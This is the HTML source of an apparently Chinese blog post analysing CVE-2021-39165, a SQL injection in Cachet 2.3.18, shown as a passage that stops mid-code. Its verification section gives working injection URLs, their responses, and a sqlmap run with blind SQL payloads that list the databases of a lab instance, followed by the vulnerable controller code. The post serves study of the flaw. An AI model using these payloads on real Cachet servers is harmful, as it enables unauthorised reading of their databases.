@@ -1,0 +1,680 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>CVE-2021-39165 Cachet SQL注入分析 - fan-tastic.fun</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="fan-tastic.fun"><meta name=description content="文章是通过P师傅的 https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html 学习 SQL注入的漏洞 环境搭建 Windows + phpstudy Cahcet项目地址：https://github.com/CachetHQ/Cach"><meta name=keywords content="fan-tastic,Rust,dev,Rust,fan-tasitc.fun,fun"><meta name=generator content="Hugo 0.104.0 with theme even"><link rel=canonical href=https://www.fan-tastic.fun/post/cachet_sql_injection/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="CVE-2021-39165 Cachet SQL注入分析"><meta property="og:description" content="文章是通过P师傅的 https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html 学习 SQL注入的漏洞 环境搭建 Windows + phpstudy Cahcet项目地址：https://github.com/CachetHQ/Cach"><meta property="og:type" content="article"><meta property="og:url" content="https://www.fan-tastic.fun/post/cachet_sql_injection/"><meta property="article:section" content="post"><meta property="article:published_time" content="2023-05-08T23:24:02+08:00"><meta property="article:modified_time" content="2023-05-09T13:38:50+08:00"><meta itemprop=name content="CVE-2021-39165 Cachet SQL注入分析"><meta itemprop=description content="文章是通过P师傅的 https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html 学习 SQL注入的漏洞 环境搭建 Windows + phpstudy Cahcet项目地址：https://github.com/CachetHQ/Cach"><meta itemprop=datePublished content="2023-05-08T23:24:02+08:00"><meta itemprop=dateModified content="2023-05-09T13:38:50+08:00"><meta itemprop=wordCount content="3400"><meta itemprop=keywords content="web漏洞分析,SQL注入,"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-39165 Cachet SQL注入分析"><meta name=twitter:description content="文章是通过P师傅的 https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html 学习 SQL注入的漏洞 环境搭建 Windows + phpstudy Cahcet项目地址：https://github.com/CachetHQ/Cach"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>fan-tastic</a></div><div class=mobile-navbar-icon><span></span>
+<span></span>
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>fan-tastic</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>CVE-2021-39165 Cachet SQL注入分析</h1><div class=post-meta><span class=post-time>2023-05-08</span><div class=post-category><a href=/categories/web%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>web漏洞分析</a></div><span class=more-meta>3400 words</span>
+<span class=more-meta>7 mins read</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class=post-toc-content><nav id=TableOfContents><ul><li><ul><li><a href=#环境搭建>环境搭建</a></li><li><a href=#漏洞验证>漏洞验证</a></li><li><a href=#漏洞分析>漏洞分析</a></li><li><a href=#总结>总结</a></li><li><a href=#相关链接>相关链接</a></li></ul></li></ul></nav></div></div><div class=post-content><p>文章是通过P师傅的 <code>https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html</code> 学习 SQL注入的漏洞</p><h2 id=环境搭建>环境搭建</h2><p>Windows + phpstudy</p><p>Cahcet项目地址：<code>https://github.com/CachetHQ/Cachet</code>
+Cachet官网：<code>https://github.com/CachetHQ/Cachet</code>
+版本：Cachet-2.3.18</p><p>安装方式可以参考：<code>https://docs.cachethq.io/docs/installing-cachet</code></p><p>搭建环境需要注意一个地方，需要配置伪静态：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-apache data-lang=apache><span class=line><span class=cl><span class=nt>&lt;IfModule</span> <span class=s>mod_rewrite.c</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>RewriteEngine</span> <span class=k>On</span>
+</span></span><span class=line><span class=cl>    <span class=nb>RewriteBase</span> /
+</span></span><span class=line><span class=cl>    <span class=nb>RewriteCond</span> %{REQUEST_FILENAME} !-f
+</span></span><span class=line><span class=cl>    <span class=nb>RewriteCond</span> %{REQUEST_FILENAME} !-d
+</span></span><span class=line><span class=cl>    <span class=nb>RewriteRule</span> ^(.*)$ index.php [L,E=PATH_INFO:$1]
+</span></span><span class=line><span class=cl><span class=nt>&lt;/IfModule&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>如果不配置为静态，会导致访问的时候必须是 <code>/index.php</code> 访问，但是安装执行初始化的时候，发送的请求的url 默认没有<code>index.php</code></p><h2 id=漏洞验证>漏洞验证</h2><p>访问 <code>http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=?%20and%201=1)--</code> 可以返回数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;meta&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;pagination&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;total&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;count&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;per_page&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;current_page&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;total_pages&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;links&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&#34;next_page&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&#34;previous_page&#34;</span><span class=p>:</span> <span class=kc>null</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;link&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;status&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;order&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;group_id&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;enabled&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;created_at&#34;</span><span class=p>:</span> <span class=s2>&#34;2023-05-09 10:56:41&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;updated_at&#34;</span><span class=p>:</span> <span class=s2>&#34;2023-05-09 10:56:41&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;deleted_at&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;status_name&#34;</span><span class=p>:</span> <span class=s2>&#34;运行正常&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;tags&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&#34;&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>访问 <code>http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=?%20and%201=2)--</code> data 中为空</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;meta&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;pagination&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;total&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;count&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;per_page&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;current_page&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;total_pages&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;links&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&#34;next_page&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nt>&#34;previous_page&#34;</span><span class=p>:</span> <span class=kc>null</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>通过SQLMap进行测试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>❯ python3 sqlmap.py -u <span class=s2>&#34;http://192.168.121.131:10000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)*+--+&#34;</span> --dbs
+</span></span><span class=line><span class=cl>        ___
+</span></span><span class=line><span class=cl>       __H__
+</span></span><span class=line><span class=cl> ___ ___<span class=o>[)]</span>_____ ___ ___  <span class=o>{</span>1.7.1.1#dev<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[</span>,<span class=o>]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
+</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 11:11:36 /2023-05-09/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>custom injection marker <span class=o>(</span><span class=s1>&#39;*&#39;</span><span class=o>)</span> found in option <span class=s1>&#39;-u&#39;</span>. Do you want to process it? <span class=o>[</span>Y/n/q<span class=o>]</span> 
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resuming back-end DBMS <span class=s1>&#39;mysql&#39;</span> 
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
+</span></span><span class=line><span class=cl>sqlmap resumed the following injection point<span class=o>(</span>s<span class=o>)</span> from stored session:
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl>Parameter: <span class=c1>#1* (URI)</span>
+</span></span><span class=line><span class=cl>    Type: boolean-based blind
+</span></span><span class=line><span class=cl>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span class=line><span class=cl>    Payload: http://192.168.121.131:10000/api/v1/components?name<span class=o>=</span>1<span class=p>&amp;</span>1<span class=o>[</span>0<span class=o>]=</span><span class=p>&amp;</span>1<span class=o>[</span>1<span class=o>]=</span>a<span class=p>&amp;</span>1<span class=o>[</span>2<span class=o>]=</span><span class=p>&amp;</span>1<span class=o>[</span>3<span class=o>]=</span>or <span class=s1>&#39;a&#39;</span><span class=o>=</span>? and <span class=nv>1</span><span class=o>=</span>1<span class=o>)</span> AND <span class=nv>8193</span><span class=o>=</span><span class=m>8193</span> -- 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: http://192.168.121.131:10000/api/v1/components?name<span class=o>=</span>1<span class=p>&amp;</span>1<span class=o>[</span>0<span class=o>]=</span><span class=p>&amp;</span>1<span class=o>[</span>1<span class=o>]=</span>a<span class=p>&amp;</span>1<span class=o>[</span>2<span class=o>]=</span><span class=p>&amp;</span>1<span class=o>[</span>3<span class=o>]=</span>or <span class=s1>&#39;a&#39;</span><span class=o>=</span>? and <span class=nv>1</span><span class=o>=</span>1<span class=o>)</span> AND <span class=o>(</span>SELECT <span class=m>1816</span> FROM <span class=o>(</span>SELECT<span class=o>(</span>SLEEP<span class=o>(</span>5<span class=o>)))</span>BTmc<span class=o>)</span> --
+</span></span><span class=line><span class=cl>---
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
+</span></span><span class=line><span class=cl>web application technology: PHP 7.1.9, Apache 2.4.39
+</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.0.12
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching database names
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching number of databases
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resumed: <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resumed: information_schema
+</span></span><span class=line><span class=cl><span class=o>[</span>11:11:39<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resumed: cachet
+</span></span><span class=line><span class=cl>available databases <span class=o>[</span>2<span class=o>]</span>:
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> cachet
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> information_schema
+</span></span></code></pre></td></tr></table></div></div><h2 id=漏洞分析>漏洞分析</h2><p><code>Cachet</code> 是基于 Laraverl 框架实现的，按照P师傅的文章，主要关注如下部分：</p><ul><li>网站路由 (app/Http/Routes)</li><li>控制器（app/Http/Controllers）</li><li>中间件（app/Http/Middleware）</li><li>Model（app/Models）</li><li>网站配置（config）</li><li>第三方扩展（composer.json）</li></ul><p>关于StatusPage的相关路由(app/Http/Routes/StatusPageRoutes.php)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>class</span> <span class=nc>StatusPageRoutes</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd>     * Define the status page routes.
+</span></span></span><span class=line><span class=cl><span class=sd>     *
+</span></span></span><span class=line><span class=cl><span class=sd>     * @param \Illuminate\Contracts\Routing\Registrar $router
+</span></span></span><span class=line><span class=cl><span class=sd>     *
+</span></span></span><span class=line><span class=cl><span class=sd>     * @return void
+</span></span></span><span class=line><span class=cl><span class=sd>     */</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>map</span><span class=p>(</span><span class=nx>Registrar</span> <span class=nv>$router</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>group</span><span class=p>([</span><span class=s1>&#39;middleware&#39;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=s1>&#39;web&#39;</span><span class=p>,</span> <span class=s1>&#39;ready&#39;</span><span class=p>,</span> <span class=s1>&#39;localize&#39;</span><span class=p>]],</span> <span class=k>function</span> <span class=p>(</span><span class=nx>Registrar</span> <span class=nv>$router</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;as&#39;</span>   <span class=o>=&gt;</span> <span class=s1>&#39;status-page&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;uses&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;StatusPageController@showIndex&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;incident/{incident}&#39;</span><span class=p>,</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;as&#39;</span>   <span class=o>=&gt;</span> <span class=s1>&#39;incident&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;uses&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;StatusPageController@showIncident&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;metrics/{metric}&#39;</span><span class=p>,</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;as&#39;</span>   <span class=o>=&gt;</span> <span class=s1>&#39;metrics&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;uses&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;StatusPageController@getMetrics&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nv>$router</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;component/{component}/shield&#39;</span><span class=p>,</span> <span class=s1>&#39;StatusPageController@showComponentBadge&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>通过这个部分可以看到的信息有：</p><ul><li>path 对应的Controller的方法</li><li>该模块使用的中间件</li></ul><p>这里使用了三个中间件 <code>['web', 'ready', 'localize']</code>， 可以根据名字在 <code>app/Http/Kernel</code> 找到对应的中间件。
+在漏洞挖掘中，我们可以先关注那些不需要检验权限的Controller,对于 Cachet 代码中，即那些没有使用 admin 和 auth 中间件的 controller。</p><p>存在漏洞的地方 <code>app/Http/Controllers/Api/ComponentController.php的getComponents</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl>    <span class=sd>/**
+</span></span></span><span class=line><span class=cl><span class=sd>     * Get all components.
+</span></span></span><span class=line><span class=cl><span class=sd>     *
+</span></span></span><span class=line><span class=cl><span class=sd>     * @return \Illuminate\Http\JsonResponse
+</span></span></span><span class=line><span class=cl><span class=sd>     */</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getComponents</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>app</span><span class=p>(</span><span class=nx>Guard</span><span class=o>::</span><span class=na>class</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$components</span> <span class=o>=</span> <span class=nx>Component</span><span class=o>::</span><span class=na>query</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$components</span> <span class=o>=</span> <span class=nx>Component</span><span class=o>::</span><span class=na>enabled</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$components</span><span class=o>-&gt;</span><span class=na>search</span><span class=p>(</span><span class=nx>Binput</span><span class=o>::</span><span class=na>except</span><span class=p>([</span><span class=s1>&#39;sort&#39;</span><span class=p>,</span> <span class=s1>&#39;order&#39;</span><span class=p>,</span> <span class=s1>&#39;per_page&#39;</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$sortBy</span> <span class=o>=</span> <span class=nx>Binput</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;sort&#39;</span><span class=p>))</span> <span class=p>{</span>
